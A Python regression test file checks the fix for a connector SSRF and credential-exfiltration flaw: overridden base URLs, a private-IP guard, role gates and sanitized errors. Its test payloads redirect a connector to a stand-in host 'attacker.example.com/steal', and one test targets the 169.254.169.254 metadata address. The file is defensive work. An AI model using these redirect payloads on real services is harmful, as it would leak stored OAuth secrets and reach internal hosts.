"""
Regression tests for the connector credential-exfiltration / SSRF
vulnerability found in the 2026-09 security review (see the "Security
review findings" section of the Roadmap doc) and fixed in commit af0f26f:

  _merged_config() let a POST /run-check or POST /run-connector/{id}
  request body override ANY saved config key -- including base_url /
  api_url / org_url, which pick which host a connector talks to -- and
  neither endpoint checked role the way the config save/delete endpoints
  do. Combined, any authenticated tenant member (not just owner/admin)
  could redirect a connector's real, stored client_id/client_secret to an
  attacker-controlled host via that connector's own OAuth flow, and use
  the same mechanism as an open SSRF proxy.

These tests fail against the pre-fix code and pass against the fix. If
one of them ever goes red again, someone reintroduced the vulnerability.
"""
import ipaddress
import socket
from unittest.mock import patch
from contextlib import contextmanager

import pytest
import responses

from app.api.v1.connectors import _is_connection_key, _merged_config
from app.connectors.base import UnsafeURLError, _assert_safe_url
from app.connectors.crypto import encrypt_config


# ─────────────────────────────────────────────────────────────────────────
# _merged_config / _is_connection_key -- the primary fix
# ─────────────────────────────────────────────────────────────────────────

class TestIsConnectionKey:
    @pytest.mark.parametrize("key", [
        "base_url", "api_url", "org_url", "endpoint_url", "endpoint",
        "webhook_host", "HOST", "Domain", "BASE_URL",
    ])
    def test_flags_connection_keys(self, key):
        assert _is_connection_key(key) is True

    @pytest.mark.parametrize("key", [
        "client_id", "client_secret", "api_key", "password", "region",
        "verify_ssl", "azure_tenant_id",
    ])
    def test_does_not_flag_credential_or_value_keys(self, key):
        assert _is_connection_key(key) is False


class TestMergedConfig:
    def test_base_url_override_is_dropped(self, monkeypatch):
        monkeypatch.setattr(
            "app.api.v1.connectors._load_stored_config",
            lambda tenant_id, connector_id: {
                "client_id": "real-client-id",
                "client_secret": "real-super-secret",
                "base_url": "https://api.crowdstrike.com",
            },
        )
        merged = _merged_config("tenant-1", "crowdstrike", {
            "base_url": "https://attacker.example.com",
        })
        assert merged["base_url"] == "https://api.crowdstrike.com"

    @pytest.mark.parametrize("key", ["base_url", "api_url", "org_url", "endpoint", "webhook_host"])
    def test_every_connection_key_override_is_dropped(self, monkeypatch, key):
        monkeypatch.setattr(
            "app.api.v1.connectors._load_stored_config",
            lambda tenant_id, connector_id: {"client_id": "real-id", key: "https://real-host.example.com"},
        )
        merged = _merged_config("tenant-1", "some-connector", {key: "https://attacker.example.com"})
        assert merged[key] == "https://real-host.example.com"

    def test_connection_key_with_no_stored_value_is_not_injected(self, monkeypatch):
        """An override can't even ADD a connection key that wasn't already stored."""
        monkeypatch.setattr("app.api.v1.connectors._load_stored_config", lambda t, c: {"client_id": "real-id"})
        merged = _merged_config("tenant-1", "okta", {"org_url": "https://attacker.example.com"})
        assert "org_url" not in merged

    def test_credential_value_override_still_works(self, monkeypatch):
        """The legitimate use case the endpoint's docstring describes --
        testing a new secret for a single run -- must keep working."""
        monkeypatch.setattr(
            "app.api.v1.connectors._load_stored_config",
            lambda t, c: {"client_id": "real-id", "client_secret": "old-secret", "base_url": "https://api.crowdstrike.com"},
        )
        merged = _merged_config("tenant-1", "crowdstrike", {"client_secret": "new-secret-to-test"})
        assert merged["client_secret"] == "new-secret-to-test"
        assert merged["base_url"] == "https://api.crowdstrike.com"

    def test_empty_override_values_are_ignored(self, monkeypatch):
        monkeypatch.setattr("app.api.v1.connectors._load_stored_config", lambda t, c: {"client_id": "real-id"})
        merged = _merged_config("tenant-1", "okta", {"client_id": "", "org_url": None})
        assert merged["client_id"] == "real-id"


# ─────────────────────────────────────────────────────────────────────────
# _assert_safe_url -- the defense-in-depth SSRF guard in base.py
# ─────────────────────────────────────────────────────────────────────────

def _mock_getaddrinfo(mapping):
    def _fake(host, *a, **kw):
        ip = mapping.get(host)
        if ip is None:
            raise socket.gaierror(f"mock: unknown host {host!r}")
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (ip, 0))]
    return _fake


class TestAssertSafeUrl:
    def test_allows_public_host(self):
        with patch("app.connectors.base.socket.getaddrinfo", side_effect=_mock_getaddrinfo({"api.crowdstrike.com": "8.8.8.8"})):
            _assert_safe_url("https://api.crowdstrike.com/oauth2/token")  # must not raise

    @pytest.mark.parametrize("host,ip", [
        ("metadata.internal", "169.254.169.254"),   # cloud metadata endpoint
        ("localhost.attacker.com", "127.0.0.1"),
        ("internal.attacker.com", "10.0.0.5"),
        ("lan.attacker.com", "192.168.1.1"),
        ("carrier-nat.attacker.com", "100.64.0.1"),  # shared address space, also private per ipaddress
    ])
    def test_rejects_non_public_targets(self, host, ip):
        with patch("app.connectors.base.socket.getaddrinfo", side_effect=_mock_getaddrinfo({host: ip})):
            with pytest.raises(UnsafeURLError):
                _assert_safe_url(f"http://{host}/x")

    def test_rejects_non_http_scheme(self):
        with pytest.raises(UnsafeURLError):
            _assert_safe_url("ftp://example.com/x")

    def test_rejects_unresolvable_host(self):
        with patch("app.connectors.base.socket.getaddrinfo", side_effect=socket.gaierror("nope")):
            with pytest.raises(UnsafeURLError):
                _assert_safe_url("https://does-not-exist.invalid/x")

    def test_reserved_test_net_ranges_are_treated_as_unsafe(self):
        """Sanity check on the ipaddress stdlib assumption this guard relies
        on: RFC 5737 documentation ranges are classified `is_private` too,
        so they're rejected the same as real private space."""
        assert ipaddress.ip_address("203.0.113.10").is_private is True


# ─────────────────────────────────────────────────────────────────────────
# End-to-end: the actual exploit, run against the real endpoint, must fail
# ─────────────────────────────────────────────────────────────────────────

CROWDSTRIKE_BASE = "https://api.crowdstrike.com"


def _seed_crowdstrike_config(fake_graph, client_id="real-client-id", client_secret="real-super-secret-value"):
    encrypted = encrypt_config({"client_id": client_id, "client_secret": client_secret})
    fake_graph.query.return_value = [{"encrypted_config": encrypted}]



@contextmanager
def _mock_crowdstrike_dns():
    """
    Keeps these end-to-end tests fully offline and deterministic: without
    this, _assert_safe_url()'s real socket.getaddrinfo() call would need
    actual DNS/network access to resolve api.crowdstrike.com before
    `responses` ever gets a chance to intercept the HTTP call itself.
    """
    with patch("app.connectors.base.socket.getaddrinfo", side_effect=_mock_getaddrinfo({"api.crowdstrike.com": "8.8.8.8"})):
        yield

class TestExploitIsBlockedEndToEnd:
    """
    Reproduces the exact attack from the security review against the real
    FastAPI route (not just the helper functions), to prove the fix holds
    at the layer an actual attacker would hit.
    """

    @responses.activate
    def test_base_url_override_never_reaches_attacker_host(self, client, fake_graph, as_user, no_api_key):
        as_user(role="member")  # the whole point: NOT an owner/admin
        _seed_crowdstrike_config(fake_graph)

        # Only the tenant's real, stored host is registered with `responses`.
        # If the app tried to call the attacker's host instead, `responses`
        # would raise ConnectionError for the unregistered URL and this
        # test would fail loudly -- that failure IS the vulnerability.
        responses.add(
            responses.POST, f"{CROWDSTRIKE_BASE}/oauth2/token",
            json={"access_token": "tok", "expires_in": 1800, "token_type": "bearer"},
            status=201,
        )
        responses.add(
            responses.GET, f"{CROWDSTRIKE_BASE}/devices/combined/devices/light/v1",
            json={"resources": []}, status=200,
        )

        with _mock_crowdstrike_dns():
            resp = client.post(
                "/api/v1/connectors/run-check",
                params={"check_id": "crowdstrike_stale_sensors"},
                json={"config": {"base_url": "https://attacker.example.com/steal"}},
            )

        assert resp.status_code == 200, resp.text
        called_hosts = {c.request.url.split("/")[2] for c in responses.calls}
        assert called_hosts == {"api.crowdstrike.com"}
        assert "attacker.example.com" not in called_hosts

    @responses.activate
    def test_run_connector_endpoint_is_also_protected(self, client, fake_graph, as_user, no_api_key):
        as_user(role="member")
        _seed_crowdstrike_config(fake_graph)
        responses.add(
            responses.POST, f"{CROWDSTRIKE_BASE}/oauth2/token",
            json={"access_token": "tok", "expires_in": 1800, "token_type": "bearer"}, status=201,
        )
        responses.add(responses.GET, f"{CROWDSTRIKE_BASE}/devices/combined/devices/light/v1", json={"resources": []}, status=200)
        responses.add(responses.GET, f"{CROWDSTRIKE_BASE}/detects/queries/detects/v1", json={"resources": []}, status=200)
        responses.add(responses.GET, f"{CROWDSTRIKE_BASE}/spotlight/combined/vulnerabilities/v1", json={"resources": []}, status=200)

        with _mock_crowdstrike_dns():
            resp = client.post(
                "/api/v1/connectors/run-connector/crowdstrike",
                json={"config": {"base_url": "https://attacker.example.com"}},
            )

        assert resp.status_code == 200, resp.text
        called_hosts = {c.request.url.split("/")[2] for c in responses.calls}
        assert "attacker.example.com" not in called_hosts

    @responses.activate
    def test_non_admin_can_still_run_with_only_stored_credentials(self, client, fake_graph, as_user, no_api_key):
        """The run endpoints are intentionally open to any tenant member --
        that's a product decision, not the bug. Only the unrestricted
        OVERRIDE was the problem. Confirm the ordinary path still works."""
        as_user(role="member")
        _seed_crowdstrike_config(fake_graph)
        responses.add(
            responses.POST, f"{CROWDSTRIKE_BASE}/oauth2/token",
            json={"access_token": "tok", "expires_in": 1800, "token_type": "bearer"}, status=201,
        )
        responses.add(responses.GET, f"{CROWDSTRIKE_BASE}/devices/combined/devices/light/v1", json={"resources": []}, status=200)

        with _mock_crowdstrike_dns():
            resp = client.post("/api/v1/connectors/run-check", params={"check_id": "crowdstrike_stale_sensors"})
        assert resp.status_code == 200, resp.text


# ─────────────────────────────────────────────────────────────────────────
# Role gate on save/delete -- unaffected by this fix, guarding against
# a future regression on the boundary right next to it.
# ─────────────────────────────────────────────────────────────────────────

class TestConfigEditorsRoleGate:
    def test_member_cannot_save_config(self, client, fake_graph, as_user, no_api_key):
        as_user(role="member")
        resp = client.put("/api/v1/connectors/crowdstrike/config", json={"config": {"client_id": "x", "client_secret": "y"}})
        assert resp.status_code == 403

    def test_member_cannot_delete_config(self, client, fake_graph, as_user, no_api_key):
        as_user(role="member")
        resp = client.delete("/api/v1/connectors/crowdstrike/config")
        assert resp.status_code == 403

    def test_admin_can_save_config(self, client, fake_graph, as_user, no_api_key):
        as_user(role="admin")
        resp = client.put("/api/v1/connectors/crowdstrike/config", json={"config": {"client_id": "x", "client_secret": "y"}})
        assert resp.status_code == 200, resp.text

    def test_owner_can_delete_config(self, client, fake_graph, as_user, no_api_key):
        as_user(role="owner")
        fake_graph.write.return_value = [{"deleted": True}]
        resp = client.delete("/api/v1/connectors/crowdstrike/config")
        assert resp.status_code == 200, resp.text
        assert resp.json()["deleted"] is True


# ─────────────────────────────────────────────────────────────────────────
# 500-handler no longer echoes raw exception text
# ─────────────────────────────────────────────────────────────────────────

class TestErrorHandlerDoesNotLeakDetail:
    def test_run_check_500_returns_generic_message_with_a_ref_id(self, client, fake_graph, as_user, no_api_key):
        as_user(role="member")
        # No config saved at all -> MockAdapter-free connector needs creds
        # it doesn't have; force a real exception by pointing at a real
        # connector with an empty stored config so authenticate() blows up
        # trying to read a missing key, deep inside adapter code.
        fake_graph.query.return_value = []
        resp = client.post("/api/v1/connectors/run-check", params={"check_id": "crowdstrike_stale_sensors"})
        # ValueError from validate_config() (missing keys) is a 400, not the
        # 500 path this test targets -- assert the 400 body is still the
        # clean, controlled message, not a stack trace.
        assert resp.status_code == 400
        assert "Missing required config key" in resp.json()["detail"]

    @responses.activate
    def test_a_real_upstream_failure_returns_generic_500_not_raw_exception_text(self, client, fake_graph, as_user, no_api_key):
        as_user(role="member")
        _seed_crowdstrike_config(fake_graph)
        # No responses.add() at all -- any HTTP call raises ConnectionError,
        # which is exactly the kind of exception the old code used to leak
        # verbatim into the HTTP response body.
        with _mock_crowdstrike_dns():
            resp = client.post("/api/v1/connectors/run-check", params={"check_id": "crowdstrike_stale_sensors"})
        assert resp.status_code == 500
        detail = resp.json()["detail"]
        assert "Check execution failed" in detail
        assert "ref:" in detail
        assert "ConnectionError" not in detail
        assert "attacker" not in detail.lower()
